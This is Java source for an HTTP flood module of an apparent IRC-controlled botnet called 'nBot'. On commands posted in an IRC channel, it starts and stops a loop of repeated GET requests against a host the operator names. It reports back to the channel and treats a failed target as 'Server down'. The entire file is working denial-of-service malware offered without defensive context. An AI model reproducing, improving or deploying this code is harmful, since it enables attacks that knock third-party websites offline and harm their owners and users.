
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Executors;

public class HTTPFlood implements Runnable, Handler {

    private String host;
    private int times;
    private int delay;
    private static boolean httpFlooding;

    public boolean processCommand(String[] args, String nick) {
        if (args[0].equals(";httpflood")) {
            startFlood(args[1], Integer.parseInt(args[2]), Integer.parseInt(args[3]));
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " HTTP Flooding " + args[1]);
            return true;
        }
        if (args[0].equals(";stophttpflood")) {
            httpFlooding = false;
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " HTTP Flooding was stopped!");
            return true;
        }
        return false;
    }

    public void startFlood(String host, int times, int delay) {
        this.host = host;
        this.times = times;
        this.delay = delay;
        httpFlooding = true;
        Executors.newSingleThreadExecutor().execute(this);
    }

    @Override
    public void run() {
        IRC.sendMessage(Config.channel, "HTTP flood started to " + host + " times " + times + " delay " + delay);
        for (int i = 0; i < times; i++) {
            if (httpFlooding) {
                try {
                    URL url = new URL(host);
                    HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                    urlConnection.setRequestProperty("User-Agent", "I do not support.");
                    urlConnection.setRequestMethod("GET");
                    BufferedReader bIn = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
                    String line;
                    while ((line = bIn.readLine()) != null) {
                    }
                    Thread.sleep(delay);
                } catch (Exception e) {
                    IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Server down, flooding stopped!");
                    break;
                }
            } else {
                break;
            }
        }
        IRC.sendMessage(Config.channel, "HTTP flood was completed!");
    }
}
